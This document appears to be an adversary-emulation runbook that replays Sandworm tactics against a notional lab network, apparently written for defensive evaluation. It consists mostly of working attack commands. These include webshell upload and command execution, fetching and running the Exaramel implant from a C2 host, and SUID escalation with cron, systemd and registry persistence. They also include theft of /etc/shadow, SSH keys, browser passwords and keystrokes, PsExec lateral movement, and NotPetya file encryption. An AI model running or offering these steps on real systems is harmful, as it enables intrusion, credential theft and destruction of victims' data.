# Scenario Overview

This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.

This scenario emulates Sandworm TTPs based on several malware specimens either used by or associated with the Sandworm actors:

1. P.A.S. Webshell
2. Exaramel (Linux and Windows variants)
3. NotPetya

![Sandworm Protections Diagram](/Resources/images/Sandworm%20Protections.drawio.png)

---

## Test 7 (Steps 11-14)

### Step 11 - Initial Compromise

:microphone: `voice track`

Sandworm logs into patient zero via SSH using Valid Accounts for the user fherbert.

It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit).

Sandworm then deploys a PHP webshell for persistent access.

```
Compromised user info:

User:	fherbert

File write: /tmp/search.php, /var/www/html/search.php

System: 10.0.1.5 / caladan

C2:	192.168.0.4 connects to 10.0.1.5:443 via HTTPS (self signed cert)
```

### :biohazard: Procedures

Upload P.A.S. webshell to caladan/10.0.1.5 as `/tmp/search.php`.

```bash
# Sandworm Team have used previously acquired legitimate credentials prior to attacks.

# Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.

scp sandworm/Resources/phpWebShell/obfuscated_webShell.php fherbert@10.0.1.5:/tmp/search.php
```

Password:

`Whg42WbhhCE17FEzrqeJ`

Move P.A.S. webshell to `/var/www/html` so it can be invoked via httpd.

```bash
ssh fherbert@10.0.1.5 "sudo mv /tmp/search.php /var/www/html/"
```

[Source Code](/Resources/phpWebShell/webShell.php)

[Source Code - Obfuscated](/Resources/phpWebShell/obfuscated_webShell.php)

### :microscope: Cited Intelligence

* https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01

* https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf

<br>

### Step 12 - Initial Discovery

:microphone: `voice track`

Sandworm enumerates information about the compromised system by issuing shell commands through the PHP webshell.

Executed commands include whoami, uname, ls, among others.

### :biohazard: Procedures

Execute `whoami` from P.A.S. webshell.

```bash
# Sandworm Team has collected the username from a compromised host.

curl --insecure "https://10.0.1.5/search.php?cmd=whoami"
```

:information_source: The '--insecure' option is used so that curl ignores self-signed certificate warnings. Self-signed certificates are used on host Caladan/10.0.1.5 for the scenario.

Execute `uname -a` from P.A.S. webshell.

```bash
# Sandworm Team used a backdoor to enumerate information about the infected system's operating system.

curl --insecure "https://10.0.1.5/search.php?cmd=uname+-a"
```

Execute `ls -lsahR` from P.A.S. webshell.

```bash
# Sandworm Team has enumerated files on a compromised host.

# P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.

curl --insecure "https://10.0.1.5/search.php?cmd=ls+-lsahR+/"
```

Execute `cat /etc/passwd` from P.A.S. webshell.

```bash
# P.A.S. Webshell can display the /etc/passwd file on a compromised host.

curl --insecure "https://10.0.1.5/search.php?cmd=cat+/etc/passwd"
```

[Source Code](/Resources/phpWebShell/webShell.php#L35)

### :microscope: Cited Intelligence

* https://www.justice.gov/opa/press-release/file/1328521/download 

* https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/

<br>

### Step 13 - Upload and Execute Exaramel (Linux Variant)

:microphone: `voice track`

Sandworm downloads an ELF executable from the control server using curl.

The ELF executable is an implant based on Exaramel-Linux.

Once downloaded to disk, Sandworm sets Exaramel-Linux's file permissions to read-write-execute.

Finally, Sandworm executes Exaramel-Linux.

Exaramel-Linux establishes HTTPS C2 with the control server.

```
C2 Info

Connects to: 192.168.0.4:443

Protocol: HTTPS

File write: /var/www/html/centreon_module_linux_app64
```

### :biohazard: Procedures

:warning: Open a new terminal tab (ctrl+shift+t) and start the control server.

Double click the terminal tab to change its name. Name your terminal tab "control server" for easy identification.

```bash
cd wizard_spider/Resources/control_server && sudo ./controlServer
```

:warning: Go back to your P.A.S. webshell terminal.

Execute `curl` to download Exaramel-Linux to `/var/www/html/centreon_module_linux_app64`:

```bash
# P.A.S. Webshell can upload and download files to and from compromised hosts.

curl --insecure "https://10.0.1.5/search.php?cmd=curl+--insecure+https://192.168.0.4/getFile/Exaramel-Linux+-o+centreon_module_linux_app64"
```

Confirm 'centreon_module_linux_app64' downloaded successfully:

```bash
curl --insecure "https://10.0.1.5/search.php?cmd=ls+-lsah"
```

Make Exaramel-Linux executable via `chmod`.

```bash
# P.A.S. Webshell has the ability to modify file permissions.

curl --insecure "https://10.0.1.5/search.php?cmd=chmod+755+centreon_module_linux_app64"
```

Insert 1-liner into `/var/www/html/include/tools/check.sh`; the 1-liner executes Exaramel-Linux.

```bash
curl --insecure "https://10.0.1.5/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh"
```

Execute SUID binary, `/bin/backup`; this binary executes `check.sh` from the previous step, which causes Exaramel-Linux to be executed with root privileges.

```bash
# Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality.

curl --insecure "https://10.0.1.5/search.php?cmd=/bin/backup" &
```

[Source Code](/Resources/suid-binary/suid-binary.c)

:warning: Switch to your controlServer tab; you should have a new callback.

### :microscope: Cited Intelligence

* https://www.justice.gov/opa/press-release/file/1328521/download 

<br>

### Step 14 - Exaramel Linux Persistence

:microphone: `voice track`

During this step, Sandworm establishes crontab and systemd persistence.

Sandworm then exfils /etc/shadow, bash history, and fherbert's SSH keys over the existing C2 channel.

In the next step, Sandworm uses credentials derived from the /etc/shadow file to attack a lateral host.

### :biohazard: Procedures

From your control server tab, split the window horizontally:

```
Right click > Split Horizontally
```


In your lower terminal, enter the control server directory. Interaction with Exaramel-Linux (the implant) will occur through this terminal.

```
cd ~/wizard_spider/Resources/control_server
```

Set cron persistence.

```bash
# Exaramel for Linux uses crontab for persistence if it does not have root privileges.

./evalsC2client.py --set-task exaramel-implant "persist cron"
```

[Source Code](/Resources/Exaramel/configur/configur.go#L212)

Set systemd persistence.

```bash
# Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.

./evalsC2client.py --set-task exaramel-implant "persist systemd"
```

[Source Code](/Resources/Exaramel/configur/configur.go#L261)

Get /etc/shadow.

```bash
# Note: not in CTI but in TTP scope
# OS Credential Dumping: /etc/passwd and /etc/shadow

./evalsC2client.py --set-task exaramel-implant "exec cat /etc/shadow"
```

Get bash history.

```bash
# Note: not in CTI but in TTP scope
# Unsecured Credentials: Bash History

./evalsC2client.py --set-task exaramel-implant "exec cat /home/fherbert/.bash_history"
```

[Source Code](/Resources/Exaramel/worker/worker.go#L156)

Download SSH keys from caladan to control server (HTTPS to 192.168.0.4:8443)

```bash
# Note: not in CTI but in TTP scope
# Unsecured Credentials: Private Keys

./evalsC2client.py --set-task exaramel-implant "get /home/fherbert/.ssh/id_rsa caladan_id_rsa"
```

```bash
./evalsC2client.py --set-task exaramel-implant "get /home/fherbert/.ssh/id_rsa.pub caladan_id_rsa.pub"
```

[Source Code](/Resources/Exaramel/worker/worker.go#L100)

Confirm SSH keys are present on attack platform:

```bash
ls -lsah files/
```

### :microscope: Cited Intelligence

* https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/

* https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf

<br>

## Test 8 (Steps 15-17)

### Step 15 - Move laterally to Windows host

:microphone: `voice track`

During this step, Sandworm uses credentials gained from step4 to move laterally to gammu/10.0.1.7 as local admin user fherbert.

The way this works is Sandworm first uploads an Exaramel dropper to disk using smbclient with valid credentials. 

The Exaramel dropper is uploaded to `C:\\Windows\\wsmprovav.exe`.

Sandworm then establishes a bind shell to gammu using PsExec.py from the Impacket framework.

From the bind shell, Sandworm establishes registry persistance as user fherbert.

Sandworm then disconnects from the bindshell.

Notionally, the legitimate fherbert user logs in via RDP.

This causes the registry persistence to execute the Exaramel dropper.

The exaramel dropper downloads and executes an Exaramel DLL.


```
Compromised user info:

User:	fherbert@WORKGROUP

System: 10.0.1.7 / gammu

PsExec Service: Windows Check AV

File write: C:\\Windows\\wsmprovav.exe, C:\\Windows\\wsmprovav.dll

Registry Path: HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run

Key: SecurityHealth

Value: C:\Windows\wsmprovav.exe http://192.168.0.4:8080/getFile/wsmprovav.dll C:\Windows\wsmprovav.dll

Exaramel-Windows C2: 192.168.0.4:443 HTTPS

```

### :biohazard: Procedures

:warning: If you do not already have the Control Server from Step 13 running, execute the following. Otherwise, skip to the next :warning:.

Open a new terminal tab (ctrl+shift+t) and start the control server.

Double click the terminal tab to change its name. Name your terminal tab "control server" for easy identification.

```bash
cd wizard_spider/Resources/control_server && sudo ./controlServer
```

:warning: Go back to your first terminal tab (P.A.S. Webshell); re-name it "PsExec-Gammu".

Upload Exaramel-Windows-Dropper.exe to gammu/10.0.1.7 as `C:\Windows\wsmprovav.exe`.

```bash
# Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.

# Sandworm Team have used previously acquired legitimate credentials prior to attacks.

smbclient -U 'WORKGROUP\fherbert' //10.0.1.7/ADMIN$ -c "put sandworm/Resources/Exaramel-Windows-Dropper/wsmprovav.exe wsmprovav.exe;" "Whg42WbhhCE17FEzrqeJ"
```

Use psexec.py to gain a bind-shell to gammu/10.0.1.7 over SMB (TCP 445):

```bash
# Sandworm-associated malware including Olympic Destroyer, BlackEnergy, and notPetya use PsExec to interact with the ADMIN$ network share to execute commands on remote systems.

# The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description "Windows Check AV."

/usr/share/doc/python-impacket/examples/psexec.py -service-name "Windows Check AV" WORKGROUP/fherbert@10.0.1.7
```

Enter password:

`Whg42WbhhCE17FEzrqeJ`

:warning: Observe the PsExec binary name, and paste it in the Slack chat for easy identification:

```bash
# Your EXE name will differ

[*] Uploading file enTHfBuw.exe
```

Load the registry hive for user fherbert.

```bash
reg.exe LOAD HKU\Temp "C:\Users\fherbert\NTUSER.DAT"
```

Set registry persistence for user fherbert only.

This will execute a Exaramel-Windows dropper on fherbert login.

```bash
# Sandworm associated malware such as Exaramel-Windows and Olympic Destroyer have modified the registry.

# Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.
```
```bash
reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "C:\Windows\wsmprovav.exe http://192.168.0.4:8080/getFile/wsmprovav.dll C:\Windows\wsmprovav.dll"
```

Terminate the PsExec.py session. Keep your terminal open.

```bash
exit
```

You will now RDP into gammu, role-playing as the legitimate fherbert user.

```bash
xfreerdp +clipboard /u:WORKGROUP\\fherbert /p:"Whg42WbhhCE17FEzrqeJ" /v:10.0.1.7
```

:warning: Keep the gammu-RDP window open.

On login, the fherbert registry persistence will execute the exaramel-windows-dropper (wsmprovav.exe).

The dropper will download Exaramel-Windows over HTTP. The dropper then executes the Exaramel-Windows (wsmprovav.dll) using rundll32.exe.

[Source Code](/Resources/Exaramel-Windows-Dropper/main.cpp)

:warning: Switch to your control server terminal; you should have a new C2 session from Exaramel-Windows.

### :microscope: Cited Intelligence

* https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html

* https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/

* https://blog.talosintelligence.com/2018/02/olympic-destroyer.html

* https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/

<br>

### Step 16 - Windows Discovery

:microphone: `voice track`

Using the Exaramel-Windows C2 channel, Sandworm obtains the current username, OS version, performs a recursive file listing, and queries for RDP connections.

### :biohazard: Procedures

Place your cursor on the second pane in the control server window.

Run the following discovery commands:

Get current user.

```bash
# Sandworm Team has collected the username from a compromised host.

./evalsC2client.py --set-task Exaramel-Windows "get-user"
```

[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L36)

Get Windows version info.

```bash
# Sandworm Team used a backdoor to enumerate information about the infected system's operating system.

./evalsC2client.py --set-task Exaramel-Windows "get-sysinfo"
```

[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L46)

List entire file system.

```bash
# Sandworm Team has enumerated files on a compromised host.

./evalsC2client.py --set-task Exaramel-Windows "enum-files C:\\"
```

[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L55)

Look for RDP connections.

```bash
# Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.

./evalsC2client.py --set-task Exaramel-Windows "exec-cmd netstat -ano | findstr 3389"
```

[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)

### :microscope: Cited Intelligence

* https://www.justice.gov/opa/press-release/file/1328521/download

* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/

* https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/

<br>

### Step 17 - Credential Dumping

:microphone: `voice track`

During this step, Sandworm collects credentials.

Sandworm first uploads two files to disk:

```
1. C:\Windows\System32\oradump.exe
2. C:\Windows\System32\mslog.exe
```

oradump.exe is a variant of the open source tool, LaZagne. It has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.

mslog.exe is a keylogger that uses the SetWindowsHookEx function; mslog.exe writes a keystroke log file to C:\Windows\System32\mslog.txt.

Sandworm obtains web browser credentials via oradump.exe.

Sandworm obtains domain admin credentials by keylogging an RDP session from a valid user.

Sandworm then gets a list of all domain hosts using dsquery.

### :biohazard: Procedures

Upload the webCredDumper to gammu over Exaramel-Windows C2 channel (HTTPS / 192.168.0.4:443):

```bash
./evalsC2client.py --set-task Exaramel-Windows "get-file https://192.168.0.4/getFile/dumpWebBrowserCreds.exe C:\\Windows\\System32\\oradump.exe"
```

Execute the webCredDumper; you should see credentials from Chromium.

```bash
# Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.

./evalsC2client.py --set-task Exaramel-Windows "exec-cmd C:\\Windows\\System32\\oradump.exe"
```

[Modified LaZagne](/Resources/browser-creds/Windows)

Upload keylogger to gammu.

```bash
./evalsC2client.py --set-task Exaramel-Windows "get-file https://192.168.0.4/getFile/keylogger.exe C:\\Windows\\System32\\mslog.exe"
```

Execute the keylogger, logging keystrokes to mslog.txt.

```bash
# Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.

./evalsC2client.py --set-task Exaramel-Windows "exec-background C:\\Windows\\System32\\mslog.exe -o C:\\Windows\\System32\\mslog.txt"
```

[Keylogger Source Code](/Resources/keylogger/src/SetWindowsHookEx-Keylogger.cpp)

Now we will exercise the keylogger.

:warning: Switch to the gammu-RDP-session window. 

Open the Windows RDP client on Gammu and *manually* type the following:

```
IP Address:  10.0.1.4
Username:    patreides
Password:    ebqMB7DmM81QVUqpf7XI
```

You must type this data manually to exercise the keylogger (caveat: if you fail to enter the password on the first try, just copy/paste it).

Give arrakis a minute to load, then right-click sign-out from the RDP session.

Keep the gammu RDP session open.

:warning: Go back to your control server terminal.

Confirm the keylogger log file exists:

```bash
./evalsC2client.py --set-task Exaramel-Windows "exec-cmd dir C:\\Windows\\System32\\mslog.txt"
```

Confirm the keylogger actually logged keystrokes:

```
./evalsC2client.py --set-task Exaramel-Windows "exec-cmd type C:\\Windows\\System32\\mslog.txt"
```

[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)

Exfil the keylog file over the Exaramel-Windows C2 session (HTTPS).

:warning: Exaramel-Windows automatically RC4 encrypts the keylog file before exfiltration.

```bash
# Exaramel for Windows automatically encrypts files before sending them to the C2 server.

./evalsC2client.py --set-task Exaramel-Windows "put-file C:\\Windows\\System32\\mslog.txt"
```

[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L94)

Confirm you uploaded the keylog file; you should see an RC4 encrypted blob.

```
cat files/mslog.txt
```

Terminate the keylogger

```bash
./evalsC2client.py --set-task Exaramel-Windows "exec-cmd taskkill /F /IM mslog.exe"
```

Enumerate all domain hosts (prep for notpetya deployment)

```bash
# Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.

./evalsC2client.py --set-task Exaramel-Windows "exec-cmd dsquery.exe computer -s 10.0.1.4 -u patreides -p ebqMB7DmM81QVUqpf7XI"
```

Cleanup artifacts.

```bash
# Sandworm Team has used backdoors that can delete files used in an attack from an infected system.

./evalsC2client.py --set-task Exaramel-Windows "exec-cmd del /Q C:\\Windows\\System32\oradump.exe C:\\Windows\\System32\\mslog.exe C:\\Windows\\System32\\mslog.txt"
```

:warning: Go back to the gammu RDP session; right-click sign-out.

### :microscope: Cited Intelligence

* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/

* https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/

<br>

## Test 9 (Steps 18-19)

### Step 18 - Pivot to DC

:microphone: `voice track`

Sandworm logs into arrakis/10.0.1.4 over RDP using domain credentials (patreides).

Sandworm uploads a DLL based on NotPetya to arrakis (C:\Windows\perfc.dat) over a network share tunneled through the RDP connection.

```
File write: C:\Windows\perfc.dat
```

### :biohazard: Procedures

:warning: go back to your first terminal window; rename to RDP into arrakis. 

RDP into arrakis/domain controller using domain admin credentials.

```bash
# Sandworm Team has used stolen credentials to access administrative accounts within the domain.

xfreerdp +clipboard /u:WORKGROUP\\patreides /p:"ebqMB7DmM81QVUqpf7XI" /v:10.0.1.4 /drive:X,sandworm/Resources/NotPetya/bin
```

Accept certificate warnings if prompted.

Once logged in, close server manager and any spurious warnings or pop-ups.

Open PowerShell as administrator `(right click > run as administrator > yes)`:

Copy NotPetya from dungeon to arrakis over RDP channel:

```
copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat
```

Delete the RDP network share:

### :microscope: Cited Intelligence

* https://www.justice.gov/opa/press-release/file/1328521/download

* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/

* https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/

<br>

### Step 19 - Deploy NotPetya

:microphone: `voice track`

Sandworm executes NotPetya (perfc.dat) on arrakis / 10.0.1.4.

NotPetya creates a scheduled task called "Restart" that reboots the workstation and is executed at the end of the program.

NotPetya encrypts files under C:\Users (recursive) via AES-128.

NotPetya drops a ransom note in C:\README.txt.

NotPetya copies and executes itself on 10.0.1.8.


### :biohazard: Procedures

```bash
# NotPetya is executed using rundll32. #1 - is the first function exported in the DLL

# NotPetya creates a task to reboot the system one hour after infection.

# NotPetya searches for hosts for lateral movement

# NotPetya searches for credentials

# NotPetya copies and executes itself (via wmic) on discovered hosts

# NotPetya searches for files with specific file extensions for encryption.

# NotPetya uses wevtutil to clear the Windows event logs.

# NotPetya executes the scheduled task to reboot the host.
```
```
rundll32.exe C:\Windows\perfc.dat,"#1"
```

Scenario complete.

Note: if you need to confirm encryption worked, do the following:

Open CMD, and cat this file:

```
type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf
```

If the file looks like encrypted binary, notPetya worked.

You may also run this command on Quadra to confirm lateral movement worked:

From DC PowerShell:

```
Enter-PsSession -ComputerName quadra
```

```
type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf
```

### :microscope: Cited Intelligence

* https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html

* https://www.us-cert.gov/ncas/alerts/TA17-181A

* https://www.justice.gov/opa/press-release/file/1328521/download

<br>

